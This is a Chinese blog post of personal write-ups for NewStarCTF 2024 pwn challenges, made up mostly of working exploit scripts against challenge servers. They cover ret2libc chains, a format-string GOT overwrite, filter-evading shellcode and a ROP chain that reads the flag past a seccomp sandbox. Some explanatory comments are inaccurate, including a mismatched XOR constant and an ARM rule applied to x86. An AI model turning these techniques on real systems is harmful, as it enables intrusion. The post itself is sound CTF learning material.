---
title: newstarctf2024 pwn个人复现
date: 2024-11-10 21:00:00 +0800
categories: [Blog, pwn]
tags: [pwn]
---
# newstarctf 2024 pwn个人复现
从8月15日开始学习pwn有一段时间，最近似乎又陷入了瓶颈期，经过一段时间的反思，到底还是懒于思考，懒于实践。故鞭策自己，望勤动手，勤复现。  

为了能够充分利用有限的时间，在此只记录我认为值得记录的部分。  

## week1
都还算比较基础的内容
### game
自己的解法，即按照题目的思路来输入数字即可
```python
from pwn import *

io = remote("39.106.48.123", 31448)
index=0
while(index<=999):
    io.recvuntil("num:")
    io.sendline(b"9")
    index += 9
    print(index)
io.interactive()
```
官方wp给出的另一种解法：利用`scanf`函数的`%d`格式解析特性。以下是原话：  

scanf 在解析 %d 遇到非数字的时候，会停止解析，但不会抛出异常，会直接返回目前的结果。  
 
比如下面这个语句：  

```C
scanf("%d", &value);
```
假设 `value` 原本是 `10`，如果输入 `1a`，那么会解析到 `1` 的输入，而忽略后面的`a`，这时候 `value` 会被变成 `1`.  

如果不输入数字，直接输入 `a`，这时候，`scanf` 什么数字也解析不到，也就无法对 `value` 做修改。是的，这时候 `value` 的值没有变！并且由于这个解析的异常，会导致输入缓冲区无法被刷新，也就是说下一次调用的时候，下一个 `scanf` 会从 `a` 开始解析。  

这么一想，那么我只需要输入寥寥几个字符，比如： `10a`，第一次调用 `scanf` 会解析出 `10`，并且给结果加上 `10`. 后面每次循环，`scanf` 会从剩下的 `a` 的位置进行解析，但是由于不是数字会被忽略，所以这个多出来的 `a` 就一直在！并且 `value` 的值没有变，保留上一次的 `10`. 因此，`scanf` 永远无法跳过这个 `a` 字符，最终就导致一直加 `10`，直到结果大于 `999`  

### gdb
这道题的逻辑是对输入后的内容进行验证和匹配，由于匹配的key是写死在程序里后经过加密函数加密的，因此直接gdb动调到匹配的那一步进行观察就可以了  

```python
from pwn import *

context(arch='amd64', os='linux',log_level='debug')

io = remote("8.147.132.32", 18505)
#io = process('../newstarctf/gdb')
print(pidof(io))
payload = b"\x5d\x1d\x43\x55\x53\x45\x57\x45"
#0x4557455355431d5d
io.recvuntil("data")
io.send(payload)
io.interactive()
```
### overwrite
这道题的考点是通过整数溢出突破read读取从而可以覆盖到栈上的变量
```python
from pwn import *

io = remote("39.106.48.123", 33789)
payload = cyclic(0x80-0x50) + b"114515"
io.recvuntil("readin")
io.sendline(b"-1")
io.recvuntil("say")
io.sendline(payload)
io.interactive()
```
## week2
### ez_game
常规的ret2libc，需要注意栈对齐
```python
from pwn import *

context(arch='amd64', os='linux',log_level='debug')

io = remote("101.200.139.65", 30798)
print(pidof(io))
libc = ELF('../newstarctf/libc-2.31.so')
elf = ELF('../newstarctf/attachment')
main = elf.symbols['main']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = 0x400783
ret = 0x400509

payload1 = cyclic(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
io.recvuntil(b"!")
io.sendline(payload1)
puts_addr = u64(io.recvuntil(b'Wel')[-10:-4].ljust(8, b'\x00'))
print(hex(puts_addr))

base_addr = puts_addr - libc.symbols['puts']
system_addr = base_addr + libc.symbols['system']
bin_sh = base_addr + next(libc.search(b'/bin/sh'))

payload2 = cyclic(0x50+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system_addr)
io.recvuntil(b"!")
io.sendline(payload2)
io.interactive()
```
注意到官方的exp中有写法：
```python
libc = elf.libc
```
不知道原理是什么🧐 但下次试一试😋
### EZ_fmt
这道题算是我第一次做fmt类型的题目，为了做这道题才开始翻wiki翻资料，才开始学习fmt。虽说题还算常规，但还是记录下来，也算是记录自己学习fmt的过程。有机会单开一篇讲一下fmt。  

只允许读取`0x30`进行fmt，所以对于payload的构造要慎重  

除此之外补充一点：如果读取的字节太少那就很难完成任意地址写，此时出题人往往希望你利用fmt进行泄露  

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

elf = ELF('./pwn')
libc = ELF('./libc.so.6')
io = remote("39.106.48.123",29840)
puts_got = elf.got['puts']
read_got = elf.got['read']
printf_got = elf.got['printf']
memset_got = elf.got['memset']

print(hex(printf_got))

print(p64(read_got))
payload1 = b'AAAAAAAA' + b'|%p|'*10
offset = 8
payload2 = b'%9$s' + b'\x00\x00\x00\x00' + p64(puts_got)  #注意地址被00截断 这里用。ljust补齐8字节也可以
io.recvuntil(b"data")

io.sendline(payload2)
puts_addr = u64(io.recvuntil(b'data')[-10:-4].ljust(8, b'\x00'))
print(hex(puts_addr))

base_addr = puts_addr - libc.symbols['puts']
system_addr = base_addr + libc.symbols['system']
print('system:',hex(system_addr))

data1 = system_addr & 0xFF
data2 = ((system_addr & 0xFFFFFF) >> 8) - data1
data1 = str(data1)
data2 = str(data2)

payload = b'%'+ data1.encode() + b'c%12' + b'$hhn'
payload += b'%'+ data2.encode() + b'c%13' + b'$hn'
payload = payload.ljust(0x20,b'A') + p64(printf_got) + p64(printf_got+1)
payload = payload.ljust(0x30,b'A')

print(pidof(io))
pause()
io.send(payload)
io.sendline(b"/bin/sh\x00")
io.interactive()
```
### Inversted world
这道题真是超超超有意思  
只要善用gdb动调，理解程序在干什么就很好做了  
_read函数实现与read方向相反的读写操作  

```python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

#io = process('./pwn')
io = remote('101.200.139.65',36871)
elf = ELF('./pwn')
backdoor = elf.sym['backdoor']
backdoor_2 = 0x40137C
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

payload = b'12345678' * (32) + bytes(reversed(p64(backdoor_2)))
io.recv()
io.sendline(payload)
io.interactive()
```
### My_GBC!!!!!
不知道为什么用自带的libc打不通...最后同时泄露write和read然后用libc数据库才打通  
不过对于初出茅庐的我来说是第一次做到这种对内存编码的题，值得记录  
加密部分我是直接丢给gpt写的，最多自己微调一下  

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux',log_level='debug')

elf = ELF("../newstarctf/My_GBC!!!!!")
io = remote("8.147.132.32", 16222)
#io = process('../newstarctf/My_GBC!!!!!')
libc = ELF("../newstarctf/libc.so.6")

main = elf.sym['main']
write_plt = elf.plt['write']
write_got = elf.got['write']
read_got = elf.got['read']
pop_rdi = 0x4013b3
pop_rsi_pop_r15 = 0x4013b1
ret = 0x40101a
#找不到pop_rdx但是write可以暂时不管

def right_rotate3(byte):
    # 右旋转3位
    return ((byte >> 3) & 0xFF) | ((byte << 5) & 0xFF)
def decrypt(encrypted_data, xor_byte):
    decrypted_data = bytearray(len(encrypted_data))

    for i in range(len(encrypted_data)):
        # 先右旋转3位
        rotated_byte = right_rotate3(encrypted_data[i])

        # 异或操作
        decrypted_data[i] = rotated_byte ^ xor_byte

    return bytes(decrypted_data)

key = 0x5A

print(pidof(io))
addr = b''
for i in range(0,8):
    io.recvuntil(b"thing")
    payload1 = cyclic(0x10 + 0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi_pop_r15) + p64(write_got+i) + p64(1) + p64(
        write_plt) + p64(main)
    print(payload1)
    payload1 = decrypt(payload1, key)
    print(payload1)
    io.sendline(payload1)
    single = io.recvuntil(b"It")[-3:-2]
    addr += single
write_addr = u64(addr)
addr = b''
for i in range(0,8):
    io.recvuntil(b"thing")
    payload1 = cyclic(0x10 + 0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi_pop_r15) + p64(read_got+i) + p64(1) + p64(
        write_plt) + p64(main)
    print(payload1)
    payload1 = decrypt(payload1, key)
    print(payload1)
    io.sendline(payload1)
    single = io.recvuntil(b"It")[-3:-2]
    addr += single
read_addr = u64(addr)
print(hex(write_addr))
print(hex(read_addr))

#base_addr = addr - libc.symbols['read']
#system = base_addr + libc.symbols['system']
#bin_sh = base_addr + next(libc.search(b'/bin/sh'))

libc = LibcSearcher('write',write_addr)
libc.add_condition('read',read_addr)
base_addr = read_addr - libc.dump('read')
system = base_addr + libc.dump('system')
bin_sh = base_addr + libc.dump('str_bin_sh')

print(hex(system))
print(hex(bin_sh))
io.recvuntil(b'thing')
payload2 = cyclic(0x10+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
print(payload2)
payload2 = decrypt(payload2, key)
print(pidof(io))
pause()
io.sendline(payload2)
io.interactive()
```
### Bad Asm
这道题不太会写，为什么呢？
因为我不太会手写shellcode😰只会用shellcraft😋
等我去学，学完回来写  
```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+8h] [rbp-18h]
  int v4; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  char *dest; // [rsp+18h] [rbp-8h]

  init(argc, argv, envp);
  label();
  buf = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);
  dest = (char *)mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Input your Code : ");
  v4 = read(0, buf, 0x1000uLL);
  for ( i = 0; i < v4 - 1; ++i )
  {
    if ( *((_BYTE *)buf + i) == 15 && *((_BYTE *)buf + i + 1) == 5
      || *((_BYTE *)buf + i) == 15 && *((_BYTE *)buf + i + 1) == 52 )
    {
      puts("ERROR \\\\ Unavailable ! : syscall/sysenter/int 0x80");
      exit(1);
    }
  }
  strcpy(dest, (const char *)buf);
  exec(dest);
  exit(1);
}
```
从反编译的代码中看到程序对输入的shellcode做了限制：不能够出现syscall;sysenter;int 0x80;<br>
同时由于strcpy，shellcode中不能出现0x00，否则会导致shellcode被截断，不能完整的被copy到dest<br>
思路：xor异或加密后在内存中解密
```python
from pwn import *

context(arch='amd64', os='linux',log_level='debug')

local = 1
if local == 1:
    io = process("./pwn")
    gdb.attach(io, "b exec")
else:
    io = remote()

shellcode = asm('''
mov rsp,rdi; //之前rsp为0x0，现在给rsp一个正常地址，使得之后的execve传参能够实现
mov rax,rdi; //这里是为了内存中搓syscall做准备
mov rsi,rdi; //设置read函数参数
add sp, 800; //随便将rsp设置到一个可以当作栈的位置
mov dx, 0xffff; //设置read函数参数
mov cx, 0x454f;
xor cx, 0x4040; //0x454f xor 0x404a = 0x0f05，自此cx寄存器中存储了syscall机器码
add rax, 0x40; //设置偏移
mov [rax],cx; //将syscall放入内存中
xor rdi,rdi; //设置read函数参数
xor rax,rax;//read系统调用号 = 0
''')
shellcode = shellcode.ljust(0x40, asm('nop'))
io.send(shellcode)
shellcode2 = asm(shellcraft.sh())
pause()
io.send(b''.ljust(0x42, asm('nop')) + shellcode2)
io.interactive()
```
踩过的坑：立即数设置要合法<br>
《ARM体系结构与编程》一书中对立即数有这样的描述：每个立即数由一个8位的常数循环右移偶数位得到。
一个32位的常数，只有能够通过上面构造方法得到的才是合法的立即数。
之所以要特意设置rsp，是因为exec函数执行过程中，会将rsp，rbp等都设为0，即销毁堆栈<br>
shellcode中最关键的是借助cx寄存器生成syscall的一段，其他部分都是为了正常执行代码所做的寄存器设置
<br>
其他做法：
- 由于检测时只检测相邻两个字节是否为对应指令，所以我们可以分别使用add, mov等指令在内存中拼凑，而不使用异或（其实思路一样）
- 可以不使用reread，而是直接尝试execve

## week3
### One Last B1te
观察大佬的wp，能从中学到很多很好的pwn习惯；比如拿到二进制文件先seccomp观察沙箱；checksec观察保护机制等等<br>
这道题关键在于 Partial RELRO + 一字节任意写，使得我们可以修改got表的函数地址来执行我们想要的函数
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-18h] BYREF
  char v5[16]; // [rsp+10h] [rbp-10h] BYREF

  init(argc, argv, envp);
  sandbox();
  write(1, "Show me your UN-Lucky number : ", 0x20uLL);
  read(0, &buf, 8uLL);
  write(1, "Try to hack your UN-Lucky number with one byte : ", 0x32uLL);
  read(0, buf, 1uLL);
  read(0, v5, 0x110uLL);
  close(1);
  return 0;
}
```
在程序执行的最后`close(1)`关闭了标准输出流，正常思路来讲拥有这么大的溢出空间就会想到去ret2libc，但由于关闭了标准输出流导致泄露不了libc基址。此时应该想到我们可以1地址任意写，于是正好将close函数的got表地址重定向为其他函数。<br>
非常棒的是由于执行`close`函数之前才刚刚执行过read函数，此时参数依然残留在寄存器中，对其善加利用就可以想到`write`函数正好能利用上这些参数，将v5及其栈上的内容泄露出来。<br>
除此之外，还需要注意的是：
> 程序在新版Ubuntu24下编译，优化掉了CSU，此时我们很难利用ELF的gadget来ROP<br>

于是这里就只能利用`close`改`write`泄露栈内容来泄露libc，而不能调用`write`手动传参来泄露libc了<br>
__新知识点__：
1. 通过泄露栈上的`libc_start_main`函数地址从而获取libc基地址<br>
程序运行流程：`libc_start_main` -> `main` -> `libc_start_main`
因此当我们可以将栈中内容泄露时，如果泄露的范围比较大，就可以将`libc_start_main`函数中的某个偏移地址泄露出来，那么<br>
```python
libc_base = address - offset - libc_start_main_addr
```
拿到了libc基址后，再次考虑沙箱的问题。沙箱禁止了execve的执行，所以我们无法执行system拿到shell，只能考虑orw。<br>
做过这道题之后，获取libc基址的方法又多了一种：泄露栈内容来泄露libc<br>

2. glibc 2.39下，难以拿到rdx的gadget，代替方案：`pop rax` + `xchg eax, edx`<br>
`xchg`指令用于交换两个操作数的内容<br>
> `xchg`指令还有一个特点，那就是只占一个字节。这在许多高度限制shellcode长度的场景下非常有用<br>

exp:
```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
elf = ELF("./pwn")
libc = elf.libc
local = 0
if local == 0:
    sh = remote("172.25.128.1", 56867)
else:
    sh = process("./pwn")
    gdb.attach(sh, "b main")
main = 0x4013a3
ret = 0x40101a
sh.sendafter(b"number ", p64(0x404028))
sh.sendafter(b"byte", b"\x50")
payload = cyclic(0x10+8) + p64(ret) + p64(main)
sh.sendline(payload)
print(sh.recv(0x10))
print(sh.recv(0xb8))
libc_offset = u64(sh.recv(8).ljust(8, b'\x00'))
libc_base = libc_offset - (0x77f0dcc2a28b - 0x77f0dcc00000)
print(hex(libc_base))

pop_rsi = libc_base + 0x110a4d
pop_rdi = libc_base + 0x10f75b
pop_rax = libc_base + 0xdd237
xchg_edx_eax = libc_base + 0xb229e #xchg edx, eax ; mov eax, 0xf7000000 ; ret 0
mprotect = libc_base + libc.symbols["mprotect"]
read = libc_base + libc.symbols["read"]
shellcode_addr = 0x401000 #直接拿代码段来用

payload = cyclic(0x10 + 8) + p64(pop_rdi) + p64(shellcode_addr)
payload += p64(pop_rsi) + p64(0x1000) + p64(pop_rax) + p64(7) + p64(xchg_edx_eax) + p64(mprotect) #mrpotect改权限
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(shellcode_addr) + p64(pop_rax) + p64(0x1000) + p64(xchg_edx_eax) + p64(read)
payload += p64(shellcode_addr)
sh.sendafter(b"number ", p64(0x404028))
sh.sendafter(b"byte", b"\x50")
sh.sendline(payload)


shellcode = asm(shellcraft.open('/flag',0,0))
shellcode += asm(shellcraft.read('rax',shellcode_addr + 0x800,0x100))
shellcode += asm(shellcraft.write(2,shellcode_addr + 0x800,'rax'))
pause()
sh.sendline(shellcode)

sh.interactive()
```

